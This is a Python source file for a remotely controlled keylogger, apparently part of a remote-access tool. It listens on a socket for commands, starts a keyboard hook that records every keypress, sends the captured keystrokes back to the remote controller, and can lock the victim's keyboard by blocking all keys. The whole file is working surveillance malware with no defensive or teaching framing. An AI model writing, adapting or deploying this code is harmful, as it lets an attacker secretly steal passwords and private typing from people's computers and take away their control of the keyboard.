from pynput.keyboard import KeyCode, Listener, Key
import keyboard
import time

class KeyLogger:
    keys = ''
    is_hooking = False
    listener = None

    def __init__(self, sock = None):
        self.client = sock
        pass

    def run(self):
       while True:
            cmd = self.client.recv(32).decode('utf8')
            if cmd == "keystroke,hook":
                self.hook_key()
            elif cmd == "keystroke,unhook":
                KeyLogger.unhook_key()
            elif cmd == "keystroke,print":
                self.print_keys()
            elif cmd == "keystroke,lock":
                self.lock_keyboard()
            elif cmd == "keystroke,unlock":
                self.unlock_keyboard()
            elif cmd == "exit":
                return     
    
    def on_press(self, key):
        if type(key) == Key:
            if key == Key.space:
                KeyLogger.keys += ' '
            elif key == Key.enter:
                KeyLogger.keys += '\n'
            elif key == Key.tab:
                KeyLogger.keys += '\t'
            else:
                KeyLogger.keys += '<' + str(key) + '>'
        else:

            if key.char == None:
                if 96 <= key.vk <= 105:
                    KeyLogger.keys += "<numpad:" + chr(key.vk - 48) + ">"
                else:
                    print(key.vk, chr(key.vk))
                    KeyLogger.keys += chr(key.vk)
            else:
                if ord(key.char) < 32: 
                    KeyLogger.keys += chr(key.vk)
                else:
                    KeyLogger.keys += key.char
    
    def hook_key(self): 
        if KeyLogger.is_hooking: return
        KeyLogger.listener = Listener(on_press = self.on_press)
        KeyLogger.listener.start()
        # KeyLogger.listener.join()
        KeyLogger.is_hooking = True

    @staticmethod
    def unhook_key():
        if not KeyLogger.is_hooking: return
        KeyLogger.listener.stop()
        KeyLogger.is_hooking = False
        return False
    
    def print_keys(self):
        self.client.sendall(bytes(KeyLogger.keys, "utf8"))
        KeyLogger.keys = ''
        pass
    
    def lock_keyboard(self):
        for key in range(150):
            keyboard.block_key(key)
        pass
    
    def unlock_keyboard(self):
        keyboard.unhook_all()
        pass

    pass

# app = KeyLogger()
# app.run()